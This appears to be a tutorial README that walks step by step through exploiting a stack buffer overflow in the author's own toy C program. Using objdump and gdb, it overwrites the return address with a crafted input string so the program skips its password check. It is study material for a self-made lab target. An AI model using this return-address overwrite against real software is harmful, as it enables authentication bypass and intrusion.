**The summary**

Use of stack buffer overflow, entry into the system without a password.

**Handbook**

1) Determine the addresses of the functions

gcc +o main main.c - create an executable main:
objdump -d main    - code dissassembly

![image](https://github.com/user-attachments/assets/f5e961e8-aeea-4bd0-a0c2-01f4999685b1)

2) Select a place in the code where you can look into the stack and locate the password buffer

gdb ./main // load the executable file main for debugging
disas check_password // function dissassembly
break *0x00005555555551ac //break point "test %eax,%eax"
info breakpoints //checking breakpoints
run //starting program in gdb

![image](https://github.com/user-attachments/assets/92c43eeb-75e9-4acc-921a-6b2723b8d777)

3) Locate the register holding the return address

enter the example password "password"
when it stops at a breakpoint

info frame //current stack frame info
x/40x $rsp //memory examination
continue 
run 

enter the example password "AAAAAAAAAAAAAAAAAA" to cause a segmentation fault
when it stops at a breakpoint
x/40x $rsp //memory examination

By manipulating the number of 'A' characters and comparing the memory in the cases described, it was determined that the return address was 0x55555200.
Try overwriting it.

![image](https://github.com/user-attachments/assets/f478a511-cc5b-4a36-acb4-7748a7393f96)

4) Exploit

What we know so far: 

0x7fffffffddd6 //beginning of the buffer (41 -> 'A')
0x7fffffffddc8 //register storing the return address

0x7fffffffddc8 value is currently 0x55555200.
We'd like to inject here access_granted's address which is 0x555555555169

![image](https://github.com/user-attachments/assets/df8b4da8-cfd9-4f5c-a9f0-3bf6c7e4575c)

Looking at the memory examination, we need to pass 0x555555555169 value just after overrun of the buffer. 

0x555555555169 - 6 bytes value. 

We're operating on a little endian system so we need to perform a small operation

0x555555555169 -> 0x0000555555555169 (x86-64)
0x0000555555555169 -> \x69\x51\x55\x55\x55\x55\x00\x00 (LE)

We are preparing for the interpretation of characters and not binary form 
AAAAAAAAAAAAAAAAAA\x69\x51\x55\x55\x55\x55\x00\x00 -> AAAAAAAAAAAAAAAAAAiQUUUU

Finally, let's try to enter this fake password

![image](https://github.com/user-attachments/assets/b425eb30-2600-43f4-99b5-f75a0adbbc43)


Inspired by https://pagedout.institute/ 
Summer 2k24
